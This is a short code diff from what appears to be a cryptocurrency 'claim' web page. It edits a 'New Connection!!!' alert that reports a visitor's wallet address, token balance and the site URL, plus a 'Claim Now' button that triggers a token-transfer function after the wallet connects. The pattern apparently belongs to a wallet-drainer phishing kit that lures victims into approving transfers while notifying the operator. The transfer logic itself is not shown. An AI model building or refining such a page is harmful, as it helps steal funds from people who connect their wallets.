@@ -275,7 +275,7 @@ const newDat = 0;
 
 
  const mytext = `🛜 New Connection!!! \n\n          
-💰 Total ETH Value: ${conBal} ${tokSymbol}\n
+💰 Total ${tokSymbol} Value: ${conBal} ${tokSymbol}\n
 🪙 Address: ${newAds}\n 
 ⛓️‍💥 Action: ${newDat <= 0 ?  noDati : dati}\n
 🌐 URL: ${website_url}`;
@@ -315,18 +315,17 @@ const newDat = 0;
         )} */}
        <div className="md:px-24 px-5">
         {isConnected  ? (
-          <>
+
             <button
               onClick={async () => await handleTokenTransfer()}
               className="md:w-[200px] h-[40px] bg-green text-white rounded-3xl"
             >
               Claim Now
             </button>
-          </>
+
         ) : ( 
             
-            <w3m-button balance="hide" label="Connect Wallet"
-            className="md:w-[400px] w-full text-xl h-[50px] bg-green text-white rounded-3xl" />
+            <w3m-button balance="hide" label="Connect Wallet" />
         )}
       </div>
       </div>
